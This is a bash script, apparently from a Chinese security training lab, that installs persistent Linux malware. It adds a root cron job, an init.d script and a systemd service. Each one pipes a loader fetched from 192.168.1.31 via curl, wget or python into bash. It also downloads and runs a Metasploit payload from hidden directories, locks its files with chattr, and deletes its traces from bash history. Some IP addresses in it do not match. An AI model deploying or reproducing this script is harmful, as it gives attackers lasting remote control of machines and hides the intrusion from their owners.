#!/bin/bash
#reverse shell address
domain=192.168.1.31
#payload名称
payload=xuegod
#加载脚本名称
loader=loader
#启动脚本路径
loadup=/etc/init.d/loader
#workerdir
gitdir=./.git
mkdir -p /tmp/.a/.b/.c/
tmp=/tmp/.a/.b/.c
#当前进程数量
workerdir(){
  #已经建立的链接数量
  num=`netstat -antup|grep $domain |grep ESTABLISHED|wc -l`
  #能否访问domain获取http请求状态码
  trigger=`curl -I -m 10 -o /dev/null -s -w %{http_code}  http://$domain/`
  if [[ $num -lt 1 && $trigger -eq 200 ]];then
  #初始化工作目录
    if [ ! -d ~/.git ]; then 
      mkdir ~/.git
    fi
    if [ ! -d ./.git ]; then
      mkdir ./.git
    fi
    if [ -d ~/.git ]; then
      gitdir=~/.git
    fi
    if [ -d ./.git ]; then
      gitdir=./.git
    fi
  fi
}


createcron(){
    #添加计划任务
    cron=`grep $domain /etc/cron.d/root|wc -l`
    #判断句计划任务是否存在
    if [[ ! -f /etc/cron.d/root || cron -eq 0 ]]; then 
      chattr -i -a /etc/cron.d
      chattr -i -a /etc/cron.d/root
      #写入计划任务
      #-s表示不输出统计信息 -S表示输出错误信息需要配合-s使用 -L跟随重定向 -f 连接失败时不显示http错误
      echo "*/1 * * * * root (curl -fsSL http://$domain/$loader || wget -q -O- http://$domain/$loader || python -c 'import urllib2 as fbi;print fbi.urlopen("http://$domain/$loader").read()')| bash -sh > /dev/null 2>&1 &" >/etc/cron.d/root
      #添加ia权限 i权限表示不能修改文件，a权限仅允许增加内容不允许减少。
      chattr +i +a /etc/cron.d/root
      chattr +i +a /etc/cron.d
    fi
}

createinit(){
    #添加开机启动脚本 domain loader手工替换
    if [ ! -f $loadup ];then
tee $loadup << 'EOF'
#!/bin/bash
# chkconfig: 12345 90 90
# description: loader
### END INIT INFO
(curl -fsSL http://192.168.1.31/loader || wget -q -O- http://192.168.1.53/loader || python -c 'import urllib2 as fbi;print fbi.urlopen(http://192.168.1.53/loader).read()')| bash -sh > /dev/null 2>&1 &
EOF

    #启动脚本添加权限
    chmod +x $loadup
    chkconfig --add loader
    chattr +i +a $loadup
    fi
    #判断systemd启动脚本是否存在，不存在则创建。
    if [ ! -f /usr/sbin/xuegod ];then
tee /usr/sbin/xuegod << 'EOF'
#!/bin/bash
(curl -fsSL http://192.168.1.31/loader || wget -q -O- http://192.168.1.53/loader || python -c 'import urllib2 as fbi;print fbi.urlopen(http://192.168.1.53/loader).read()')| bash -sh > /dev/null 2>&1 &
EOF
    
    chmod +x /usr/sbin/xuegod
        #创建systemd开机启动服务
        if [ ! -f /lib/systemd/system/xuegod.service ];then
tee /lib/systemd/system/xuegod.service << 'EOF'
[Unit]
Description=xuegod
After=network.target

[Service]
Type=forking
ExecStart=/usr/sbin/xuegod

[Install]
WantedBy=multi-user.target

EOF

        #添加开机自启动并立即启动
        systemctl daemon-reload
        systemctl enable --now xuegod
        fi

    fi
}
download(){
    #下载msf payload到临时目录并添加ia权限
    if [ ! -f $tmp/$payload ]; then
      curl -fsSL -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91. 0.4472.124 Safari/537.36 Edg/91.0.864.64"  http://$domain/$payload  -o $tmp/$payload || wget -U "Mozilla/5.0 (Windows NT 10. 0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64" -q http://$domain/$payload -O $tmp/$payload
      chattr +ia $tmp/$payload
      chattr +ia $tmp
    fi   
}
runpayload(){
  #运行msf payload

  #检测msf payload已经建立的链接数量
  num=`netstat -antup|grep $domain |grep ESTABLISHED|wc -l`
  #如果工作目录中payload不存在，从临时目录cp一份并添加ia权限
  if [ ! -f $gitdir/$payload ]; then
    cp -a -r -f $tmp/$payload $gitdir/$payload
    chmod +x $gitdir/$payload
    chattr +ia $gitdir/$payload
    #chattr +ia $gitdir
  fi    
  #判断如果是docker环境并且进程数量少于1直接运行
  if [[ -e  /.dockerenv && $num -lt 1 ]];then
    $gitdir/$payload
  fi
  #进程数小于1则运行。
  if [ $num -lt 1 ];then
    nohup $gitdir/$payload >>$gitdir/.log&
  fi
  
  #简单清理history记录
  sed -i '/$domain/d' ~/.bash_history
  sed -i '/chattr/d' ~/.bash_history  
}

while true
do
  #获取当前bash -sh进程数量
  loadernum=`ps -aux|grep -v grep |grep "bash -sh" |wc -l`
  #数量少于3则运行，脚本执行到这里进程中会有2个bash -sh，所以少于3运行。
  #大于等于3的时候启动的新进程会自动退出。
  if [ $loadernum -ge 3 ];then 
    break
  fi
  #按顺序循环执行上面创建的函数。
  workerdir
  createcron
  createinit
  download
  runpayload
  #sleep 3 这里是为了减少一些难度，并且避免程序死循环一直执行消耗过多系统资源。
  sleep 3

done